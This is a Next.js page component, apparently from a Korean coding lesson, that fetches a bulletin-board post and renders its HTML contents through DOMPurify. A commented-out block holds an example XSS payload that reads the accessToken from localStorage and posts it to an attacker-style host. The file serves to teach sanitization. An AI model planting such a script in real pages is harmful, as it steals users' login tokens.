import { useQuery, gql } from "@apollo/client";
import DOMPurify from "dompurify";
import { useRouter } from "next/router";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;
export default function StaticRoutingMovedPage(): JSX.Element {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: {
      boardId: router.query.zzz,
    },
  });

  return (
    // <div>
    //   <div>작성자: {data?.fetchBoard?.writer}</div>
    //   <div>제목: {data?.fetchBoard?.title}</div>
    //   {/* <div>내용: {data?.fetchBoard?.contents}</div> */}
    //   {/* <div
    //     dangerouslySetInnerHTML={{
    //       __html: data?.fetchBoard?.contents,
    //     }} */}
    //   {typeof window !== "undefined" && (
    //     <div
    //       dangerouslySetInnerHTML={{
    //         __html: DOMPurify.sanitize(data?.fetchBoard?.contents),
    //       }}
    //     />
    //   )}
    // </div>
    <div>
      {/* <div>{router.query.qqq}번 게시글 이동이 완료되었습니다.</div> */}
      <div>작성자: {data?.fetchBoard?.writer}</div>
      <div>제목: {data?.fetchBoard?.title}</div>
      {/* <div>내용: {data?.fetchBoard?.contents}</div> */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: `
              <script>
                const qqq = localStorage.getItem("accessToken")
                axios.post("http://mybackerbackend.com/mydata", {data: qqq})
              </script>
          `,
        }}
      /> */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(data?.fetchBoard?.contents),
          }}
        />
      )}
    </div>
  );
}
